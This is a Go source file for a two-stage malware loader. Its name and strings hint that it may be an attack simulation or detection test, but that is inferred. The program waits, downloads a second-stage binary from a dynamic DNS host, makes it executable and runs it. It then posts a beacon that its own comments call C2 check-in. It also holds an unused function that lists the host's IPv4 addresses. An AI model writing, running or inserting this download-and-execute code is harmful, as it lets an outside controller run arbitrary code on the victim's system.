package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func http_post(url string, jsonStr []byte) error {

        req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
        req.Header.Set("X-Custom-Header", "myvalue")
        req.Header.Set("Content-Type", "application/json")

        client := &http.Client{}
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()

	return err
}

func http_get(url string, filename string) error {

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
        if err != nil {
                return err
        }
        defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func get_ips() ([]string, error) {

	var ips []string

	ifaces, err := net.Interfaces()
	if err != nil {
		return ips, err
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue // interface down
		}
		if iface.Flags&net.FlagLoopback != 0 {
			continue // loopback interface
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return ips, err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ip = ip.To4()
			if ip == nil {
				continue // not an Ipv4 addr
			}
			ips = append (ips, ip.String())
		}
	}
	return ips, nil
}

func main() {

	// define constants and variables
	const host = "lacework.ddns.net"
	var filename = "lw-stage-2"
	var post_url = "http://"+host+"/lw-beacon"
	var get_url = "http://"+host+"/bin/"+filename
	var body = []byte(`{"stage":"1"}`)

	// wait a few seconds
        time.Sleep(3 * time.Second)

	// download second stage file
	fmt.Println("Downloading stage 2...")
	get_err := http_get(get_url, filename)
	if get_err != nil {
		panic(get_err)
	}

	// make file executable
	chmod_err := os.Chmod(filename, 0777)
	if chmod_err != nil {
		panic(chmod_err)
	}

        //wait a few seconds
        time.Sleep(3 * time.Second)

	// get current path
	path, path_err := os.Getwd()
	if path_err != nil {
		panic (path_err)
	}

	// execute second stage binary
	fmt.Println("Executing stage 2...")
	command := exec.Command(path+"/"+filename)
	exec_err := command.Start()
	if exec_err != nil {
		panic(exec_err)
	}

	//wait a few seconds
	time.Sleep(3 * time.Second)

	//beacon to C2 once
	fmt.Println("Beaconing to C2 once...")
	post_err := http_post(post_url, body)
	if post_err != nil {
		panic(post_err)
	}

	fmt.Println("Completed. Terminating.")
}
